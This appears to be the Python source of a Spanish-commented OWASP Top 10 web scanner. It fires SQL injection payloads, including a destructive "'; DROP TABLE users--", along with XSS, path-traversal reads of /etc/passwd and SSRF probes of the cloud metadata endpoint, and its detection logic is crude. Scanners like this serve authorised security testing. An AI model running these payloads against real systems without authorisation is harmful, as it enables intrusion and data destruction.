#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MX-WEBSCAN - Escáner de vulnerabilidades web OWASP Top 10
Author: Falconmx1
GitHub: https://github.com/Falconmx1/MX-WEBSCAN
"""

import requests
import argparse
import json
import time
import hashlib
from urllib.parse import urljoin, urlparse
from datetime import datetime
from colorama import init, Fore, Style
import threading
from queue import Queue
import os

init(autoreset=True)

# Banner bien perrón
def banner():
    print(Fore.CYAN + """
    ╔══════════════════════════════════════════════════════════╗
    ║  ███╗   ███╗██╗  ██╗    ██╗    ██╗███████╗██████╗ ███████╗ ██████╗ █████╗ ███╗   ██╗
    ║  ████╗ ████║╚██╗██╔╝    ██║    ██║██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗████╗  ██║
    ║  ██╔████╔██║ ╚███╔╝     ██║ █╗ ██║█████╗  ██████╔╝███████╗██║     ███████║██╔██╗ ██║
    ║  ██║╚██╔╝██║ ██╔██╗     ██║███╗██║██╔══╝  ██╔══██╗╚════██║██║     ██╔══██║██║╚██╗██║
    ║  ██║ ╚═╝ ██║██╔╝ ██╗    ╚███╔███╔╝███████╗██║  ██║███████║╚██████╗██║  ██║██║ ╚████║
    ║  ╚═╝     ╚═╝╚═╝  ╚═╝     ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
    ║                                                                            v1.0    ║
    ║         Escáner Automatizado OWASP Top 10 - by Falconmx1 🇲🇽                    ║
    ╚══════════════════════════════════════════════════════════════════════════════════╝
    """ + Fore.YELLOW + "[!] Uso ético y legal. Solo probar sistemas con autorización.\n" + Style.RESET_ALL)

class MXWEBSCAN:
    def __init__(self, target, threads=10, proxy=None, headers=None):
        self.target = target.rstrip('/')
        self.threads = threads
        self.session = requests.Session()
        self.results = []
        self.queue = Queue()
        
        # Headers por defecto
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 MX-WEBSCAN/1.0'
        })
        
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        
        if headers:
            for key, value in headers.items():
                self.session.headers[key] = value
    
    def test_sqli(self, url, param):
        """Prueba de SQL Injection"""
        payloads = [
            "' OR '1'='1",
            "' OR SLEEP(5)--",
            "' UNION SELECT NULL--",
            "' AND 1=1--",
            "'; DROP TABLE users--"
        ]
        
        for payload in payloads:
            try:
                test_url = url.replace(f"={param}", f"={payload}")
                start = time.time()
                response = self.session.get(test_url, timeout=5)
                elapsed = time.time() - start
                
                # Detección por tiempo o errores SQL
                if elapsed > 4.5 or any(error in response.text.lower() for error in ['sql', 'mysql', 'syntax', 'unclosed']):
                    return {
                        'type': 'SQL Injection',
                        'url': test_url,
                        'payload': payload,
                        'evidence': f"Tiempo respuesta: {elapsed:.2f}s | Errores SQL detectados",
                        'risk': 'Crítica'
                    }
            except:
                continue
        return None
    
    def test_xss(self, url, param):
        """Prueba de Cross-Site Scripting"""
        payloads = [
            "<script>alert(1)</script>",
            '"><img src=x onerror=alert(1)>',
            "<svg onload=alert(1)>",
            "javascript:alert(1)"
        ]
        
        for payload in payloads:
            try:
                test_url = url.replace(f"={param}", f"={payload}")
                response = self.session.get(test_url, timeout=5)
                
                if payload in response.text and not self.is_escaped(payload, response.text):
                    return {
                        'type': 'Cross-Site Scripting (XSS)',
                        'url': test_url,
                        'payload': payload,
                        'evidence': f"Payload reflejado sin sanitizar",
                        'risk': 'Alta'
                    }
            except:
                continue
        return None
    
    def test_lfi(self, url, param):
        """Prueba de Local File Inclusion"""
        payloads = [
            "../../../etc/passwd",
            "..\\windows\\win.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd"
        ]
        
        keywords = ['root:', '[extensions]', 'bin/bash', 'daemon:']
        
        for payload in payloads:
            try:
                test_url = url.replace(f"={param}", f"={payload}")
                response = self.session.get(test_url, timeout=5)
                
                if any(keyword in response.text.lower() for keyword in keywords):
                    return {
                        'type': 'Local File Inclusion (LFI)',
                        'url': test_url,
                        'payload': payload,
                        'evidence': f"Archivo del sistema detectado: {payload}",
                        'risk': 'Alta'
                    }
            except:
                continue
        return None
    
    def test_ssrf(self, url, param):
        """Prueba de Server-Side Request Forgery"""
        internal_services = [
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:8080/admin",
            "http://127.0.0.1/config",
            "file:///etc/passwd"
        ]
        
        for service in internal_services:
            try:
                test_url = url.replace(f"={param}", f"={service}")
                response = self.session.get(test_url, timeout=5)
                
                # Si la respuesta es diferente o tiene contenido interno
                if len(response.text) > 500 or any(internal in response.text.lower() for internal in ['aws', 'localhost', 'root:', 'admin']):
                    return {
                        'type': 'Server-Side Request Forgery (SSRF)',
                        'url': test_url,
                        'payload': service,
                        'evidence': f"Acceso a recurso interno detectado",
                        'risk': 'Alta'
                    }
            except:
                continue
        return None
    
    def is_escaped(self, payload, text):
        """Verifica si el payload fue escapado"""
        escaped_versions = [
            payload.replace('<', '&lt;'),
            payload.replace('>', '&gt;'),
            payload.replace('"', '&quot;')
        ]
        return any(escaped in text for escaped in escaped_versions)
    
    def scan_parameters(self):
        """Escanea todos los parámetros de la URL"""
        parsed = urlparse(self.target)
        params = {}
        
        # Extraer parámetros de la query string
        if parsed.query:
            for param in parsed.query.split('&'):
                if '=' in param:
                    key = param.split('=')[0]
                    params[key] = param.split('=')[1] if len(param.split('=')) > 1 else ''
        
        if not params:
            print(Fore.YELLOW + "[!] No se encontraron parámetros en la URL. Agrega ?id=1 por ejemplo.")
            return
        
        print(Fore.GREEN + f"\n[+] Parámetros encontrados: {', '.join(params.keys())}")
        print(Fore.CYAN + "[*] Iniciando escaneo...\n")
        
        # Probar cada parámetro
        for param, value in params.items():
            print(Fore.WHITE + f"[→] Probando parámetro: {param}")
            
            # Construir URL base con el parámetro
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{param}=TEST"
            
            # Ejecutar pruebas
            tests = [
                ('SQLi', self.test_sqli),
                ('XSS', self.test_xss),
                ('LFI', self.test_lfi),
                ('SSRF', self.test_ssrf)
            ]
            
            for test_name, test_func in tests:
                result = test_func(base_url, "TEST")
                if result:
                    result['parameter'] = param
                    self.results.append(result)
                    print(Fore.RED + f"  ⚠️  {test_name} detectado! {result['risk']}")
    
    def generate_report(self):
        """Genera reporte en formato texto y JSON"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Reporte TXT
        txt_file = f"reports/report_{timestamp}.txt"
        os.makedirs("reports", exist_ok=True)
        
        with open(txt_file, 'w', encoding='utf-8') as f:
            f.write(f"""╔══════════════════════════════════════════════════════════════╗
║              MX-WEBSCAN REPORT - {timestamp}                  ║
╚══════════════════════════════════════════════════════════════╝

Target: {self.target}
Total Vulnerabilities: {len(self.results)}

""")
            for vuln in self.results:
                f.write(f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
TIPO: {vuln['type']}
RIESGO: {vuln['risk']}
PARÁMETRO: {vuln['parameter']}
URL: {vuln['url']}
PAYLOAD: {vuln['payload']}
EVIDENCIA: {vuln['evidence']}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
""")
        
        # Reporte JSON
        json_file = f"reports/report_{timestamp}.json"
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump({
                'target': self.target,
                'timestamp': timestamp,
                'total_vulnerabilities': len(self.results),
                'findings': self.results
            }, f, indent=4)
        
        return txt_file, json_file

def main():
    banner()
    
    parser = argparse.ArgumentParser(description='MX-WEBSCAN - Escáner OWASP Top 10')
    parser.add_argument('-u', '--url', required=True, help='URL objetivo (ej: http://testphp.vulnweb.com/artists.php?artist=1)')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Número de hilos (default: 5)')
    parser.add_argument('--proxy', help='Proxy (ej: http://127.0.0.1:8080)')
    parser.add_argument('--header', action='append', help='Headers personalizados (ej: --header "Authorization: Bearer token")')
    
    args = parser.parse_args()
    
    # Procesar headers
    headers = {}
    if args.header:
        for h in args.header:
            key, value = h.split(':', 1)
            headers[key.strip()] = value.strip()
    
    # Crear escáner
    scanner = MXWEBSCAN(args.url, args.threads, args.proxy, headers)
    
    # Ejecutar escaneo
    scanner.scan_parameters()
    
    # Mostrar resultados
    print(Fore.CYAN + "\n" + "="*60)
    print(Fore.YELLOW + f"RESUMEN DE VULNERABILIDADES ENCONTRADAS: {len(scanner.results)}")
    
    for vuln in scanner.results:
        print(Fore.RED + f"\n⚠️  {vuln['type']} - {vuln['risk']}")
        print(Fore.WHITE + f"   Parámetro: {vuln['parameter']}")
        print(Fore.WHITE + f"   Payload: {vuln['payload']}")
    
    if scanner.results:
        txt_file, json_file = scanner.generate_report()
        print(Fore.GREEN + f"\n[✓] Reportes generados:")
        print(Fore.GREEN + f"    - {txt_file}")
        print(Fore.GREEN + f"    - {json_file}")
    else:
        print(Fore.GREEN + "\n[✓] No se encontraron vulnerabilidades en los parámetros analizados.")
    
    print(Fore.CYAN + "\n[+] Escaneo completado. ¡Mantén la seguridad, bro! 🔒\n")

if __name__ == "__main__":
    main()
